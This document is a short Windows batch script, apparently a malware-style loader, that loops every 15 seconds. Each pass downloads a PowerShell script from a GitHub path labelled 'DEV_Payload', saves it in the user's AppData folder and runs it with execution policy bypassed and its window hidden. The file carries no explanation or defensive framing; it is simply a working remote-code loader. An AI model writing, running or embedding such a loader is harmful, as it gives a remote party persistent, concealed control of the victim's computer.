@echo off
:: ===============================================
:: UNIVERSAL WATCHER BOOTSTRAPPER INSTALLER LOOP
:: ===============================================

:loop
set "BOOTSTRAP=%APPDATA%\UniversalBatInstaller_Dynamic_15E1362D_E98B_4386_9CA9.ps1"
set "SCRIPT_URL=https://raw.githubusercontent.com/Umair13303/DEV_Payload/main/GitHub_Script/PowerShell/Dynamic_Watcher_15E1362D_E98B_4386_9CA9.ps1"

:: Use PowerShell to download and compare
powershell -Command ^
    "$wc = New-Object System.Net.WebClient; " ^
    "$wc.Headers.Add('User-Agent','Bootstrapper'); " ^
    "$remote = $wc.DownloadString('%SCRIPT_URL%'); " ^
    "if (Test-Path '%BOOTSTRAP%') { " ^
        "$local = Get-Content -Raw -Path '%BOOTSTRAP%'; " ^
        "if ($remote -ne $local) { " ^
            "Set-Content -Path '%BOOTSTRAP%' -Value $remote; " ^
        "} " ^
    "} else { " ^
        "Set-Content -Path '%BOOTSTRAP%' -Value $remote; " ^
    "}"

:: Run the script if it exists
if exist "%BOOTSTRAP%" (
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%BOOTSTRAP%"
)

:: Wait for 15 seconds before repeating
timeout /t 15 >nul
goto loop
